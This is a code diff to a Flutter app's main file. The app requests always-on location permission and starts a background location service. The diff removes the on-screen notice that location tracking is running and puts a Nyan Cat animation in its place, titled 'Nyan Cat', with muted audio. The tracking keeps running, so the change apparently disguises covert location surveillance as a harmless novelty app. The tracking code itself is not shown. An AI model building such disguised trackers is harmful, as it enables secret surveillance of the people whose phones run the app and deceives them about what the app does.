@@ -1,7 +1,12 @@
 import 'package:flutter/material.dart';
+import 'dart:ui' as ui;
+import 'package:flutter/services.dart';
+import 'package:just_audio/just_audio.dart';
 import 'package:permission_handler/permission_handler.dart';
+
 import 'location_service.dart';
 import 'device_service.dart';
+import 'home/home.dart';
 
 Future<void> main() async {
   WidgetsFlutterBinding.ensureInitialized();
@@ -19,7 +24,6 @@ Future<void> main() async {
     await Permission.locationAlways.request();
   }
 
-  //SystemNavigator.pop();
   runApp(const MyApp());
 }
 
@@ -31,10 +35,25 @@ class MyApp extends StatefulWidget {
 }
 
 class _MyAppState extends State<MyApp> {
+  late Future<List<ui.Image>> _nyanCatFramesFuture;
+  final player = AudioPlayer();
+
   @override
   void initState() {
     super.initState();
+
+    // Start location tracking if permission is granted
     startService();
+
+    // Load Nyan Cat frames and audio
+    _nyanCatFramesFuture = loadNyanFrames();
+    loadAudio();
+  }
+
+  @override
+  void dispose() {
+    player.dispose();
+    super.dispose();
   }
 
   Future<void> startService() async {
@@ -43,13 +62,44 @@ class _MyAppState extends State<MyApp> {
     }
   }
 
+  /// Load Nyan Cat's sound/music
+  Future<void> loadAudio() async {
+    await player.setAsset('assets/nyan-cat.ogg');
+    player.setVolume(0); // Mute by default
+  }
+
+  /// Load the assets (individual image frames) for Nyan Cat animation
+  Future<List<ui.Image>> loadNyanFrames() async {
+    var images = <ui.Image>[];
+    for (var i = 0; i < 7; i++) {
+      final data = await rootBundle.load('assets/$i.gif');
+      final codec = await ui.instantiateImageCodec(data.buffer.asUint8List());
+      final frame = await codec.getNextFrame();
+      images.add(frame.image);
+    }
+    return images;
+  }
+
   @override
   Widget build(BuildContext context) {
-    return const MaterialApp(
-      home: Scaffold(
-        body: Center(
-          child: Text('Location tracking is running in the background'),
-        ),
+    return MaterialApp(
+      title: 'Nyan Cat',
+      theme: ThemeData.dark(),
+      home: FutureBuilder<List<ui.Image>>(
+        future: _nyanCatFramesFuture,
+        builder: (_, snapshot) {
+          if (snapshot.connectionState == ConnectionState.done &&
+              snapshot.hasData) {
+            return MyHomePage(
+              frames: snapshot.data!,
+              audioPlayer: player,
+            );
+          } else {
+            return const Scaffold(
+              body: Center(child: CircularProgressIndicator.adaptive()),
+            );
+          }
+        },
       ),
     );
   }
